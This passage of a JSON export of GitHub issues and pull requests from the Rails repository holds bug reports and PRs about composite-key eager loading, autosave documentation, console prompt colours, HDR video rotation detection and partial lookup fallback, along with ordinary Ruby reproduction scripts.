        "body": "Thank you for adding support for composite primary keys for Rails. I believe I've found a use case where incorrect ActiveRecord objects are being returned when using `eager_load` or `includes` on a `has_one` association with composite primary keys. `preload` works as expected.\r\n\r\nRepro:\r\n\r\n```ruby\r\n# This code is under MIT license: See full license https://github.com/rails/rails/blob/main/MIT-LICENSE\r\n# frozen_string_literal: true\r\n\r\nrequire \"bundler/inline\"\r\n\r\ngemfile(true) do\r\n  source \"https://rubygems.org\"\r\n\r\n  gem \"activerecord\", \"7.1.3\"\r\n  gem \"sqlite3\"\r\nend\r\n\r\nrequire \"active_record\"\r\nrequire \"minitest/autorun\"\r\nrequire \"logger\"\r\n\r\n# This connection will do for database-independent bug reports.\r\nActiveRecord::Base.establish_connection(adapter: \"sqlite3\", database: \":memory:\")\r\n\r\nActiveRecord::Schema.define do\r\n  create_table :companies do |t|\r\n  end\r\n\r\n  create_table :users, primary_key: [:id, :company_id], force: true do |t|\r\n    t.integer :id\r\n    t.integer :company_id\r\n  end\r\n\r\n  create_table :profiles, primary_key: [:id, :company_id], force: true do |t|\r\n    t.integer :id\r\n    t.integer :company_id\r\n    t.integer :user_id\r\n  end\r\nend\r\n\r\nclass Company < ActiveRecord::Base\r\n  has_many :users\r\nend\r\n\r\nclass User < ActiveRecord::Base\r\n  belongs_to :company\r\n  has_one :profile, query_constraints: [:user_id, :company_id]\r\nend\r\n\r\nclass Profile < ActiveRecord::Base\r\n  belongs_to :user, query_constraints: [:user_id, :company_id]\r\nend\r\n\r\nclass BugTest < Minitest::Test\r\n  # FAIL\r\n  def test_eager_load\r\n    company = Company.create!\r\n    user1 = User.create!(id: [1, company.id])\r\n    Profile.create(id: [101, company.id], user: user1)\r\n    user2 = User.create!(id: [2, company.id])\r\n    Profile.create(id: [102, company.id], user: user2)\r\n\r\n    relation = company.users.joins(:profile)\r\n\r\n    assert_equal relation.map(&:profile), relation.eager_load(:profile).map(&:profile)\r\n  end\r\n\r\n  # FAIL\r\n  def test_includes\r\n    company = Company.create!\r\n    user1 = User.create!(id: [3, company.id])\r\n    Profile.create(id: [103, company.id], user: user1)\r\n    user2 = User.create!(id: [4, company.id])\r\n    Profile.create(id: [104, company.id], user: user2)\r\n\r\n    relation = company.users.joins(:profile)\r\n\r\n    assert_equal relation.map(&:profile), relation.includes(:profile).map(&:profile)\r\n  end\r\n\r\n  # PASS\r\n  def test_preload\r\n    company = Company.create!\r\n    user1 = User.create!(id: [5, company.id])\r\n    Profile.create(id: [105, company.id], user: user1)\r\n    user2 = User.create!(id: [6, company.id])\r\n    Profile.create(id: [106, company.id], user: user2)\r\n\r\n    relation = company.users.joins(:profile)\r\n\r\n    assert_equal relation.map(&:profile), relation.preload(:profile).map(&:profile)\r\n  end\r\nend\r\n```\r\n\r\nIn that test, we are traversing the association from `company.users` and want to load each user's `profile` to avoid N+1 queries. However, the query is returning the first profile for **all** users.\r\n\r\nThe generated SQL queries look correct to me:\r\n\r\n```sql\r\nSELECT\r\n    \"users\".\"id\" AS t0_r0,\r\n    \"users\".\"company_id\" AS t0_r1,\r\n    \"profiles\".\"id\" AS t1_r0,\r\n    \"profiles\".\"company_id\" AS t1_r1,\r\n    \"profiles\".\"user_id\" AS t1_r2\r\nFROM\r\n    \"users\"\r\n    INNER JOIN \"profiles\" ON \"profiles\".\"user_id\" = \"users\".\"id\"\r\n        AND \"profiles\".\"company_id\" = \"users\".\"company_id\"\r\nWHERE\r\n    \"users\".\"company_id\" = ?\r\n```\r\n\r\nwhich leads me to believe that the issue is when converting to ActiveRecord objects.\r\n\r\nThe bug seems to only be present when the composite primary key is setup as `[:id, :foreign_key_id]`. When setup the other way around `[:foreign_key_id, :id]` (as is the case in the [Rails test schema](https://github.com/rails/rails/blob/21eceb7db26b724d1f7a824d4cc04ddeba44244b/activerecord/test/schema/schema.rb#L244)) the bug is not present.\r\n\r\nThank you so much for your work!",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50857/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50857/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50856",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50856/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50856/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50856/events",
        "html_url": "https://github.com/rails/rails/pull/50856",
        "id": 2096854463,
        "node_id": "PR_kwDNIULOZODAXw",
        "number": 50856,
        "title": "Document autosave validation behavior for ActiveRecord associations [ci skip]",
        "user": {
            "login": "Dmoment",
            "id": 29010172,
            "node_id": "MDQ6VXNlcjI5MDEwMTcy",
            "avatar_url": "https://avatars.githubusercontent.com/u/29010172?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/Dmoment",
            "html_url": "https://github.com/Dmoment",
            "followers_url": "https://api.github.com/users/Dmoment/followers",
            "following_url": "https://api.github.com/users/Dmoment/following{/other_user}",
            "gists_url": "https://api.github.com/users/Dmoment/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/Dmoment/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/Dmoment/subscriptions",
            "organizations_url": "https://api.github.com/users/Dmoment/orgs",
            "repos_url": "https://api.github.com/users/Dmoment/repos",
            "events_url": "https://api.github.com/users/Dmoment/events{/privacy}",
            "received_events_url": "https://api.github.com/users/Dmoment/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-01-23T19:41:36Z",
        "updated_at": "2024-01-23T21:03:11Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50856",
            "html_url": "https://github.com/rails/rails/pull/50856",
            "diff_url": "https://github.com/rails/rails/pull/50856.diff",
            "patch_url": "https://github.com/rails/rails/pull/50856.patch",
            "merged_at": null
        },
        "body": "<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\n<!--\r\nThis Pull Request needs to be merged to document the behavior of autosave: true enabling validations for belongs_to and has_one associations in ActiveRecord. Currently, this behavior is implemented in the code but not mentioned in the official documentation. This can lead to confusion for developers who rely on the Rails guides for accurate information on how ActiveRecord associations work. Including this information will improve the clarity and comprehensiveness of the Rails documentation.\r\n-->\r\n\r\n### Detail\r\n\r\nThis Pull Request adds documentation comments to the belongs_to and has_one methods in ActiveRecord::Associations to explain that autosave: true also enables validations by default. This is to reflect the actual behavior of these methods, as described in the source code and observed in application behavior.\r\n\r\n### Additional information\r\n\r\nReference to the issue discussed in Rails: Undocumented - validations enabled by autosave #50807\r\nInline gemfile with bundler example -\r\n``` ruby\r\nrequire \"bundler/inline\"\r\n\r\ngemfile do\r\n  source \"https://rubygems.org\"\r\n  gem \"rails\", \"7.1.3\"\r\n  gem \"sqlite3\"\r\nend\r\n\r\nrequire \"active_record\"\r\nrequire \"minitest/autorun\"\r\nrequire \"logger\"\r\n\r\n# This connection will do for database-independent bug reports.\r\nActiveRecord::Base.establish_connection(adapter: \"sqlite3\", database: \":memory:\")\r\nActiveRecord::Base.logger = Logger.new(STDOUT)\r\n\r\nActiveRecord::Schema.define do\r\n  create_table :authors do |t|\r\n    t.string :name\r\n  end\r\n\r\n  create_table :books do |t|\r\n    t.belongs_to :author\r\n    t.string :title\r\n  end\r\nend\r\n\r\nclass Author < ActiveRecord::Base\r\n  has_one :book, autosave: true\r\nend\r\n\r\nclass Book < ActiveRecord::Base\r\n  belongs_to :author\r\n  validates :title, presence: true\r\nend\r\n\r\nclass BugTest < Minitest::Test\r\n  def test_autosave_with_validations\r\n    author = Author.new(name: \"J.K. Rowling\")\r\n    author.build_book # Not setting a title to trigger validation failure\r\n\r\n    refute author.save, \"Author should not be saved due to book validation failure\"\r\n    assert author.book.errors.full_messages.include?(\"Title can't be blank\"), \"Book should contain error on title\"\r\n  end\r\nend\r\n\r\n```\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change, specifically the addition of documentation for autosave: true behavior.\r\n* [x] Commit message includes a detailed description of the changes, for example: [Doc #50807] Document autosave validation behavior for associations.\r\n* [x] Tests are not required as this is a documentation update.\r\n* [x] CHANGELOG is not updated since this is a minor documentation change and does not affect library behavior.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50856/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50856/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50855",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50855/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50855/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50855/events",
        "html_url": "https://github.com/rails/rails/pull/50855",
        "id": 2096678832,
        "node_id": "PR_kwDNIULOZN5Sdw",
        "number": 50855,
        "title": "Display dev & test env in console prompt in blue instead of green",
        "user": {
            "login": "st0012",
            "id": 5079556,
            "node_id": "MDQ6VXNlcjUwNzk1NTY=",
            "avatar_url": "https://avatars.githubusercontent.com/u/5079556?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/st0012",
            "html_url": "https://github.com/st0012",
            "followers_url": "https://api.github.com/users/st0012/followers",
            "following_url": "https://api.github.com/users/st0012/following{/other_user}",
            "gists_url": "https://api.github.com/users/st0012/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/st0012/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/st0012/subscriptions",
            "organizations_url": "https://api.github.com/users/st0012/orgs",
            "repos_url": "https://api.github.com/users/st0012/repos",
            "events_url": "https://api.github.com/users/st0012/events{/privacy}",
            "received_events_url": "https://api.github.com/users/st0012/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-01-23T18:08:16Z",
        "updated_at": "2024-01-24T12:42:47Z",
        "closed_at": "2024-01-24T11:55:21Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50855",
            "html_url": "https://github.com/rails/rails/pull/50855",
            "diff_url": "https://github.com/rails/rails/pull/50855.diff",
            "patch_url": "https://github.com/rails/rails/pull/50855.patch",
            "merged_at": "2024-01-24T11:55:21Z"
        },
        "body": "### Motivation / Background\r\n\r\nThe combination of red and blue is more color-blind friendly than red and green.\r\n\r\nDiscussion: https://github.com/rails/rails/pull/50796#discussion_r1463670198\r\n\r\n### Detail\r\n\r\n### Additional information\r\n\r\n<!-- Provide additional information such as benchmarks, reference to other repositories or alternative solutions. -->\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50855/reactions",
            "total_count": 1,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 1,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50855/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50854",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50854/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50854/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50854/events",
        "html_url": "https://github.com/rails/rails/pull/50854",
        "id": 2096594780,
        "node_id": "PR_kwDNIULOZN0sKg",
        "number": 50854,
        "title": "Fix rotation detection for HDR videos",
        "user": {
            "login": "railsbob",
            "id": 43969,
            "node_id": "MDQ6VXNlcjQzOTY5",
            "avatar_url": "https://avatars.githubusercontent.com/u/43969?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/railsbob",
            "html_url": "https://github.com/railsbob",
            "followers_url": "https://api.github.com/users/railsbob/followers",
            "following_url": "https://api.github.com/users/railsbob/following{/other_user}",
            "gists_url": "https://api.github.com/users/railsbob/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/railsbob/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/railsbob/subscriptions",
            "organizations_url": "https://api.github.com/users/railsbob/orgs",
            "repos_url": "https://api.github.com/users/railsbob/repos",
            "events_url": "https://api.github.com/users/railsbob/events{/privacy}",
            "received_events_url": "https://api.github.com/users/railsbob/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 664533972,
                "node_id": "MDU6TGFiZWw2NjQ1MzM5NzI=",
                "url": "https://api.github.com/repos/rails/rails/labels/activestorage",
                "name": "activestorage",
                "color": "bfd4f2",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-01-23T17:20:38Z",
        "updated_at": "2024-01-23T19:28:12Z",
        "closed_at": "2024-01-23T19:28:12Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50854",
            "html_url": "https://github.com/rails/rails/pull/50854",
            "diff_url": "https://github.com/rails/rails/pull/50854.diff",
            "patch_url": "https://github.com/rails/rails/pull/50854.patch",
            "merged_at": "2024-01-23T19:28:12Z"
        },
        "body": "<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation\r\n\r\nFixes https://github.com/rails/rails/issues/50853\r\n\r\n### Detail\r\n\r\nThe video analyzer was relying on the positional reference of side_data to fetch the rotation metadata. However, the side_data is not guaranteed to be in the same position for all videos. For instance, HDR videos shot on iOS in portrait mode have \"DOVI configuration record\" side_data in the first position, followed by the \"Display matrix\" side data containing the rotation value.\r\n\r\nThis fix removes the positional reference and explicitely searches for the \"Display Matrix\" side_data to retrieve the rotation angle.\r\n\r\n### Additional information\r\n\r\n<!-- Provide additional information such as benchmarks, reference to other repositories or alternative solutions. -->\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50854/reactions",
            "total_count": 1,
            "+1": 1,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50854/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50853",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50853/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50853/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50853/events",
        "html_url": "https://github.com/rails/rails/issues/50853",
        "id": 2096448595,
        "node_id": "I_kwDNIULOfPVEUw",
        "number": 50853,
        "title": "Video analyzer does not detect rotation of HDR videos",
        "user": {
            "login": "railsbob",
            "id": 43969,
            "node_id": "MDQ6VXNlcjQzOTY5",
            "avatar_url": "https://avatars.githubusercontent.com/u/43969?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/railsbob",
            "html_url": "https://github.com/railsbob",
            "followers_url": "https://api.github.com/users/railsbob/followers",
            "following_url": "https://api.github.com/users/railsbob/following{/other_user}",
            "gists_url": "https://api.github.com/users/railsbob/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/railsbob/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/railsbob/subscriptions",
            "organizations_url": "https://api.github.com/users/railsbob/orgs",
            "repos_url": "https://api.github.com/users/railsbob/repos",
            "events_url": "https://api.github.com/users/railsbob/events{/privacy}",
            "received_events_url": "https://api.github.com/users/railsbob/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 41328116,
                "node_id": "MDU6TGFiZWw0MTMyODExNg==",
                "url": "https://api.github.com/repos/rails/rails/labels/attached%20PR",
                "name": "attached PR",
                "color": "006b75",
                "default": false,
                "description": null
            },
            {
                "id": 664533972,
                "node_id": "MDU6TGFiZWw2NjQ1MzM5NzI=",
                "url": "https://api.github.com/repos/rails/rails/labels/activestorage",
                "name": "activestorage",
                "color": "bfd4f2",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-23T16:16:32Z",
        "updated_at": "2024-01-23T19:28:13Z",
        "closed_at": "2024-01-23T19:28:13Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n\r\nPlace the sample video (rotated_hdr_video.mov) besides the analyze_rotated_hdr_video.rb and run the failing test as:\r\n\r\n```ruby\r\nruby analyze_rotated_hdr_video.rb\r\n```\r\n\r\n#### analyze_rotated_hdr_video.rb\r\n\r\n```ruby\r\n# frozen_string_literal: true\r\n\r\nrequire \"bundler/inline\"\r\n\r\ngemfile(true) do\r\n  source \"https://rubygems.org\"\r\n\r\n  git_source(:github) { |repo| \"https://github.com/#{repo}.git\" }\r\n\r\n  gem \"rails\", github: \"rails/rails\", branch: \"main\"\r\n\r\n  gem \"sqlite3\"\r\nend\r\n\r\nrequire \"active_record/railtie\"\r\nrequire \"active_storage/engine\"\r\nrequire \"tmpdir\"\r\n\r\nclass TestApp < Rails::Application\r\n  config.load_defaults Rails::VERSION::STRING.to_f\r\n\r\n  config.root = __dir__\r\n  config.hosts << \"example.org\"\r\n  config.eager_load = false\r\n  config.session_store :cookie_store, key: \"cookie_store_key\"\r\n  config.secret_key_base = \"secret_key_base\"\r\n\r\n  config.logger = Logger.new($stdout)\r\n  Rails.logger  = config.logger\r\n\r\n  config.active_storage.service = :local\r\n  config.active_storage.service_configurations = {\r\n    local: {\r\n      root: Dir.tmpdir,\r\n      service: \"Disk\"\r\n    }\r\n  }\r\nend\r\n\r\nENV[\"DATABASE_URL\"] = \"sqlite3::memory:\"\r\n\r\nRails.application.initialize!\r\n\r\nrequire ActiveStorage::Engine.root.join(\"db/migrate/20170806125915_create_active_storage_tables.rb\").to_s\r\n\r\nActiveRecord::Schema.define do\r\n  CreateActiveStorageTables.new.change\r\n\r\n  create_table :messages, force: true\r\nend\r\n\r\nclass Message < ActiveRecord::Base\r\n  has_one_attached :video\r\nend\r\n\r\nrequire \"minitest/autorun\"\r\n\r\nclass BugTest < Minitest::Test\r\n  include ActiveJob::TestHelper\r\n\r\n  def test_analyzing_a_rotated_hdr_video\r\n    message = Message.create! video: File.open(\"rotated_hdr_video.mov\")\r\n    metadata = message.video.blob.tap(&:analyze).metadata\r\n\r\n    assert_equal 1080.0, metadata[\"width\"]\r\n    assert_equal 1920.0, metadata[\"height\"]\r\n    assert_equal -90, metadata[\"angle\"]\r\n  end\r\nend\r\n\r\n```\r\n\r\n#### Sample video\r\n\r\n![rotated_hdr_video.mov](https://github.com/rails/rails/assets/43969/d9f31b02-9e1c-4a53-a44e-2006657bffe4)\r\n\r\n### Expected behavior\r\n\r\nThe attached video was shot on iPhone in a portrait mode. Analyzing the blob should detect the rotation angle value of `-90` and return height and width as `1920.0` and `1080.0` respectively.\r\n\r\n### Actual behavior\r\n\r\nThe height is returned as `1080.0` and width as `1920.0`, ignoring the rotation value.\r\n\r\n### System configuration\r\n**Rails version**: 7.1.3\r\n\r\n**Ruby version**: 3.2.0\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50853/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50853/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50852",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50852/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50852/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50852/events",
        "html_url": "https://github.com/rails/rails/pull/50852",
        "id": 2096320468,
        "node_id": "PR_kwDNIULOZNlvqQ",
        "number": 50852,
        "title": "Action View: Fallback to existing partial when possible",
        "user": {
            "login": "seanpdoyle",
            "id": 2575027,
            "node_id": "MDQ6VXNlcjI1NzUwMjc=",
            "avatar_url": "https://avatars.githubusercontent.com/u/2575027?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/seanpdoyle",
            "html_url": "https://github.com/seanpdoyle",
            "followers_url": "https://api.github.com/users/seanpdoyle/followers",
            "following_url": "https://api.github.com/users/seanpdoyle/following{/other_user}",
            "gists_url": "https://api.github.com/users/seanpdoyle/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/seanpdoyle/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/seanpdoyle/subscriptions",
            "organizations_url": "https://api.github.com/users/seanpdoyle/orgs",
            "repos_url": "https://api.github.com/users/seanpdoyle/repos",
            "events_url": "https://api.github.com/users/seanpdoyle/events{/privacy}",
            "received_events_url": "https://api.github.com/users/seanpdoyle/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 3666649,
                "node_id": "MDU6TGFiZWwzNjY2NjQ5",
                "url": "https://api.github.com/repos/rails/rails/labels/actionview",
                "name": "actionview",
                "color": "d7e102",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-23T15:19:52Z",
        "updated_at": "2024-02-27T21:49:02Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50852",
            "html_url": "https://github.com/rails/rails/pull/50852",
            "diff_url": "https://github.com/rails/rails/pull/50852.diff",
            "patch_url": "https://github.com/rails/rails/pull/50852.patch",
            "merged_at": null
        },
        "body": "Closes [#50844][]\r\n\r\nMotivation / Background\r\n---\r\n\r\nA controller declared in the top-level module can render a top-level Active Model instance whose partial is declared in the root view directory (like `articles/_article.html.erb`).\r\n\r\nA controller scoped within a module can render an Active Model instance whose partial is similarly scoped within view directory (like `scoped/articles/_article.html.erb`).\r\n\r\nA controller scoped within a module cannot render an Active Model instance whose partial is declared in the root view directory (like `articles/_article.html.erb`), despite the absence of a similarly scoped partial.\r\n\r\nThis is intended behavior that's powered by\r\n[`config.action_view.prefix_partial_path_with_controller_namespace = true`][prefix_partial_path_with_controller_namespace] (`true` by default).\r\n\r\nThis change was introduced in March of 2012 as part of [#5625][].\r\n\r\nDetail\r\n---\r\n\r\nAs a consumer of Action View, my intuition is that the lookup would fallback, in the same way that a controller that inherits from `ApplicationController` could define its own view, then rely on fallback to render an `app/views/application` partial.\r\n\r\nThis commit modifies the behavior to gracefully fall back to the root-level view partial.\r\n\r\nChecklist\r\n---\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n\r\n[#50844]: https://github.com/rails/rails/issues/50844\r\n[prefix_partial_path_with_controller_namespace]: https://guides.rubyonrails.org/configuring.html#config-action-view-prefix-partial-path-with-controller-namespace\r\n[#5625]: https://github.com/rails/rails/pull/5625\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50852/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50852/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50851",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50851/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50851/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50851/events",
        "html_url": "https://github.com/rails/rails/pull/50851",
        "id": 2095944966,
        "node_id": "PR_kwDNIULOZNRTqg",
        "number": 50851,
        "title": "Update Guides: AR querying english text to match code behavior [ci-skip]",
        "user": {
            "login": "notapatch",
            "id": 1710795,
            "node_id": "MDQ6VXNlcjE3MTA3OTU=",
            "avatar_url": "https://avatars.githubusercontent.com/u/1710795?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/notapatch",
            "html_url": "https://github.com/notapatch",
            "followers_url": "https://api.github.com/users/notapatch/followers",
            "following_url": "https://api.github.com/users/notapatch/following{/other_user}",
            "gists_url": "https://api.github.com/users/notapatch/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/notapatch/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/notapatch/subscriptions",
            "organizations_url": "https://api.github.com/users/notapatch/orgs",
            "repos_url": "https://api.github.com/users/notapatch/repos",
            "events_url": "https://api.github.com/users/notapatch/events{/privacy}",
            "received_events_url": "https://api.github.com/users/notapatch/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 150377,
                "node_id": "MDU6TGFiZWwxNTAzNzc=",
                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-01-23T12:10:23Z",
        "updated_at": "2024-01-25T19:27:33Z",
        "closed_at": "2024-01-25T19:27:16Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50851",
            "html_url": "https://github.com/rails/rails/pull/50851",
            "diff_url": "https://github.com/rails/rails/pull/50851.diff",
            "patch_url": "https://github.com/rails/rails/pull/50851.patch",
            "merged_at": "2024-01-25T19:27:16Z"
        },
